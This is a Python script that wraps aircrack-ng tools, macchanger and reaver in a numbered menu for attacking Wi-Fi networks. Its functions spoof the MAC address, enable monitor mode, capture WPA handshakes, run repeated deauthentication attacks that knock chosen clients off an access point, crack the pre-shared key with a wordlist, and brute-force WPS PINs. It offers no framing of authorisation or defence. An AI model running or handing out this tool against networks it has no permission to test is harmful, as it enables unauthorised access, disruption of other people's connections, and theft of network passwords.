import subprocess


def info_board():
    print("-------------------------------------------------------------------")
    print("|                   %%%%%%%%%%%%%%%%%%%%%%%%                      |")
    print("|                   % Configure & Sniffing %                      |")
    print("|                   %%%%%%%%%%%%%%%%%%%%%%%%                      |")
    print("|                                                                 |")
    print("|                     1) Spoof MAC Address                        |")
    print("|                     2) Start Monitor Mode                       |")
    print("|                     3) Stop Monitor Mode                        |")
    print("|                     4) Sniff Wireless Network (WEP/WPA/WPA2)    |")
    print("-----------------------------------")
    print("|                         %%%%%%%%%%%%                            |")
    print("|                         % WPA/WPA2 %                            |")
    print("|                         %%%%%%%%%%%%                            |")
    print("|                                                                 |")
    print("|            5) Wireless Packet Capture (Save as: 'BSSID'.cap)    |")
    print("|            6) Deauthentication Attack (deauth)                  |")
    print("|            7) Wordlist Attack To Crack the PSK                  |")
    print("-----------------------------------")
    print("|                           %%%%%%%                               |")
    print("|                           % WPS %                               |")
    print("|                           %%%%%%%                               |")
    print("|                                                                 |")
    print("|                     8) Sniff WPS Network                        |")
    print("|                     9) PIN Attack WPS                           |")
    print("-------------------------------------------------------------------")


def spoof_mac_address():
    print("[*] Spoof MAC Address")
    print("------------------------")
    interface = input("[*] Which interface: ")
    subprocess.run(["ifconfig", interface, "down"])
    new_mac = input("[*] Specify your new MAC address (press Enter for random MAC): ")
    if new_mac:
        subprocess.run(["macchanger", "-m", new_mac, interface])
    else:
        subprocess.run(["macchanger", "-r", interface])
    subprocess.run(["ifconfig", interface, "up"])
    # Check it again
    subprocess.run(["macchanger", "-s", interface])


def start_monitor_mode():
    print("[*] Start Monitor Mode")
    print("------------------------")
    interface = input("[*] Which interface: ")
    subprocess.run(["airmon-ng", "start", interface])


def stop_monitor_mode():
    print("[*] Stop Monitor Mode")
    print("------------------------")
    subprocess.run(["airmon-ng"])
    interface = input("[*] Which interface: ")
    subprocess.run(["airmon-ng", "stop", interface])
    subprocess.run(["iwconfig"])


def sniff_wireless_network():
    print("[*] Start airodump to sniff network using WEP/WPA/WPA2")
    print("--------------------------------------------------------")
    subprocess.run(["airmon-ng"])
    interface = input("[*] Which interface: ")
    subprocess.run(["airodump-ng", interface])


def packet_capture():
    print("[*] Packet Capture")
    print("----------------------")
    subprocess.run(["airmon-ng"])
    interface = input("[*] Which interface: ")
    channel = input("[*] Which channel: ")
    bssid = input("[*] Which AP BSSID: ")
    filename = input(f"[*] Save as (default: {bssid}-01.cap): ") or f"{bssid}-01.cap"
    subprocess.run(
        ["airodump-ng", interface, "-c", channel, "--bssid", bssid, "-w", filename]
    )


def deauth_attack():
    print("[*] Deauthentication Attack")
    print("---------------------------")
    subprocess.run(["airmon-ng"])
    interface = input("[*] Which interface: ")
    bssid = input("[*] Which AP BSSID: ")
    while True:
        c_mac = input("[*] Which Client MAC address (STATION): ")
        subprocess.run(
            ["aireplay-ng", "--deauth", "2", "-a", bssid, "-c", c_mac, interface]
        )
        op = input("[*] Do it again? [y|n]: ")
        if op == "n":
            break


def wordlist_attack():
    print("[*] Wordlist Attack")
    print("---------------------")
    hp = input("[*] Specify your handshake packet: ")
    wl = input("[*] Specify your wordlist: ")
    subprocess.run(["aircrack-ng", "-w", wl, hp])


def sniff_wps_network():
    print("[*] Sniff WPS AP")
    print("---------------------------")
    subprocess.run(["airmon-ng"])
    interface = input("[*] Which interface: ")
    subprocess.run(["wash", "-i", interface])


def pin_attack_wps():
    print("[*] Crack WPS")
    print("---------------")
    subprocess.run(["airmon-ng"])
    interface = input("[*] Which interface: ")
    ch = input("[*] Which channel: ")
    bssid = input("[*] Which AP BSSID: ")
    level = input("[*] Set a signal strength level (low 1~3 high): ")
    if level == "1":
        subprocess.run(
            ["reaver", "-i", interface, "-b", bssid, "-S", "-vv", "-d0", "-c", ch]
        )
    elif level == "2":
        subprocess.run(
            [
                "reaver",
                "-i",
                interface,
                "-b",
                bssid,
                "-S",
                "-vv",
                "-d2",
                "-t",
                "5",
                "-c",
                ch,
            ]
        )
    elif level == "3":
        subprocess.run(
            ["reaver", "-i", interface, "-b", bssid, "-S", "-vv", "-d5", "-c", ch]
        )
    else:
        print("Invalid Setting!")


def main():
    info_board()
    opt = input("Choose your option: ")
    if opt == "1":
        spoof_mac_address()
    elif opt == "2":
        start_monitor_mode()
    elif opt == "3":
        stop_monitor_mode()
    elif opt == "4":
        sniff_wireless_network()
    elif opt == "5":
        packet_capture()
    elif opt == "6":
        deauth_attack()
    elif opt == "7":
        wordlist_attack()
    elif opt == "8":
        sniff_wps_network()
    elif opt == "9":
        pin_attack_wps()
    else:
        print("Invalid Option!")


if __name__ == "__main__":
    main()
